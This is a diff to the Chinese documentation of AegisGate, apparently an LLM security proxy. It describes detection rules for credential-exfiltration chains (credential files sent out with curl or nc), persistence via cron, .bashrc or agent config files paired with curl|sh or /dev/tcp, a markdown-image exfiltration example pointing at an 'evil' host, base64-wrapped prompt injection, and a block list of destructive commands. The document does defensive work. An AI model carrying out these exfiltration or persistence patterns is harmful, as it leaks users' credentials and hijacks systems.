@@ -329,13 +329,17 @@ AegisGate 是独立的安全代理层，**不管理也不约束上游服务**。
 - `privilege_guard` 与 `request_sanitizer` 对研究/教学/引用类上下文有降权处理，避免安全分析类内容被过度拦截。
 - **解码结果回流**：多级解码（base64 / hex / URL）出来的文本不再只匹配 `decoded_keywords` 那九条关键词，而是重跑 `direct_patterns` / `system_exfil_patterns` / `tool_call_injection_patterns` 三个指令族，命中记为 `decoded:<规则 ID>`，落进它作为明文时会落进的同一个信号桶。此前把一条注入用 base64 包一层，就能从刚刚扫过外层文本的每一个规则族旁边走过去。`html_markdown` / `remote_content` / `spam_noise` 这类描述**书写形式**的规则族刻意不回流——解码之后它们说明不了什么。
 - `tool_call_guard` 若要切换到严格白名单模式，可在 `security_filters.yaml` 中显式配置 `tool_whitelist` 与 `action_map.tool_call_guard.disallowed_tool=block`。
+- **外泄链路规则（`exfil_chain_*`）**：判定的是「采集 + 出口」两种能力在同一条命令里同时成立——凭据文件/凭据目录/浏览器密钥库/整环境导出，与 `curl -F`、`-T`、`--data-binary @`、管道进 `nc`、`Invoke-RestMethod -Method Post` 之类的外发动作。单独出现任意一侧都是日常开发动作，**不入库**；只有成对出现才判定。三条边界是刻意的：凭据文件必须带点前缀（`.env`，而不是 URL 里的 `/env` 路径段），`.env.example` 一类模板排除在外；`scp` / `rsync` 不在覆盖范围内——它们的 `-F`/`-T` 是「ssh config」「临时目录」而非「上传」；收割类规则要求出现真实的密钥关键字，而不只是一个看起来像递归的选项。分布在三处，各自的处置不同：
+  - `tool_call_guard.dangerous_param_patterns`（6 条）：作用于工具调用参数，按 `review` 抬分并标记复核；同时经 `router::_tool_call_guard_patterns` 参与自动遮挡时的工具调用剥离。
+  - `sanitizer.command_patterns`（5 条）：作用于响应正文，命中即 `response_disposition=sanitize`。少的那条是 `exfil_chain_secret_in_url_query`——正文里的一个文档示例 URL 不该让流式回答被截断。
+  - `sanitizer.force_block_command_patterns`（2 条）：最高置信的两种形态，由 `AEGIS_STRICT_COMMAND_BLOCK_ENABLED`（默认 `false`）把关。
 - **持久化规则（`exfil_persist_*`）**：判定「自启动面 + 拉取远程代码并执行」同时成立——`crontab` / `/etc/systemd/system` / LaunchAgents / `HKCU\...\Run` / `.bashrc` / `.zshrc` 等，配上 `curl … | sh`、`/dev/tcp/`、`Invoke-Expression` 之类的载荷。写 `.bashrc` 是日常配置、装个 cron 是日常部署，**单侧一律不判**；两者成对才没有善意解释。另有一条针对 agent 改写自身配置（MCP server 定义、`settings.json`、`CLAUDE.md`、skill 文件）后接网络命令的情形。这三条不在 `_PATH_REFERENCE_PATTERN_IDS` 里，因此对写文件类工具同样生效——攻击本身就是那次写入。
 - **markdown 图片外带（`exfil_egress_markdown_image_secret`）**：`![](https://evil/?d=KEY)` 渲染即发出请求，不需要点击。规则**要求 query 里带密钥形态或 AegisGate 占位符**——不带密钥的普通 markdown 图片就只是一张图，既有的 `<img>` 规则也正是为此刻意不设动作。它同时登记在 `injection_detector.html_markdown_patterns`（只计分）与 `sanitizer.unsafe_markup_patterns`（真正移除）。后者是执行点：`OutputSanitizer` 是响应侧最后一个过滤器，跑在还原之后，看到的是占位符背后的真实凭据。
 - **还原侧的位置判据**：`restoration.suspicious_context_patterns` 原本只问「措辞可不可疑」，不命中就无条件把占位符还原成真实值写回正文——措辞是可以改写的。新增三条**按位置**判定：占位符出现在 URL query 值、网络命令的参数位、markdown 图片 URL 里。这些位置正是数据离开本机的地方，换个说法绕不过去。
 
 **分级变形策略**：
 
-- **极度危险指令**（`rm -rf`、SQL 注入、反弹 shell、fork bomb、`curl|bash`、`dd if=of=`、`mkfs`、`powershell -enc` 等）：片段被完全替换为 `【AegisGate已处理危险疑似片段】`，**原文不会出现在返回中**。该模式集由代码在启动时合成（`router.py::_critical_danger_patterns`），来源为 `anomaly_detector.command_patterns` 中的 8 类严重规则、`sanitizer.force_block_command_patterns`、`privilege_guard.blocked_patterns` 与 13 条硬编码 shell 模式；具体条数随 `security_filters.yaml` 变动。
+- **极度危险指令**（`rm -rf`、SQL 注入、反弹 shell、fork bomb、`curl|bash`、`dd if=of=`、`mkfs`、`powershell -enc` 等）：片段被完全替换为 `【AegisGate已处理危险疑似片段】`，**原文不会出现在返回中**。该模式集由代码在启动时合成（`router.py::_critical_danger_patterns`），来源为 `anomaly_detector.command_patterns` 中的 8 类严重规则、`sanitizer.force_block_command_patterns`（含两条 `exfil_chain_*`，**这条来源不受 `AEGIS_STRICT_COMMAND_BLOCK_ENABLED` 把关**）、`privilege_guard.blocked_patterns` 与 13 条硬编码 shell 模式；具体条数随 `security_filters.yaml` 变动。
 - **一般危险片段**（系统提示词泄露、可疑权限操作等）：使用 chunked-hyphen 分词变形（如 `dev-elo-per mes-sag-e`）。
 
 建议：
@@ -614,11 +618,19 @@ curl http://127.0.0.1:18080/health
 curl http://127.0.0.1:18080/ready
 ```
 
-响应体里有 `checks` 映射和 `degraded_checks` 列表。其中一项**只上报、不影响就绪判定**：
-规则文件在磁盘上解析不了时，`security_rules` 会显示 `stale: <错误>`。此时网关仍在执行
-最后一次成功加载的那份规则，因此依然可以服务；而所有副本读的是同一个文件，在这里让就绪
-失败会把它们同时摘掉，把一个配置笔误变成一次故障。**请对 `degraded_checks` 告警，而不是
-只看状态码。**
+响应体里有 `checks` 映射和 `degraded_checks` 列表。其中两项**只上报、不影响就绪判定**：
+
+- 规则文件在磁盘上解析不了时，`security_rules` 会显示 `stale: <错误>`。此时网关仍在执行
+  最后一次成功加载的那份规则，因此依然可以服务；而所有副本读的是同一个文件，在这里让就绪
+  失败会把它们同时摘掉，把一个配置笔误变成一次故障。
+- 有效风险阈值被 clamp 到高于 `action_map` 能给出的任何分数时，`risk_gate` 会显示
+  `unreachable: security_level=… effective_threshold=…`。此时所有「只抬 risk、不设
+  disposition」的 `block` 条目都是空转。在 `AEGIS_SECURITY_LEVEL=low` 下这就是该档位的
+  定义，不是故障，所以不参与就绪判定；上报是因为**另一条到达同一状态的路径是回归**——
+  而在此之前这个条件在任何地方都没有出口。直接设 `disposition` 的过滤器不受影响，这正是
+  这类失效只坏一半、很难被发现的原因。
+
+**请对 `degraded_checks` 告警，而不是只看状态码。**
 
 UI 检查：
 
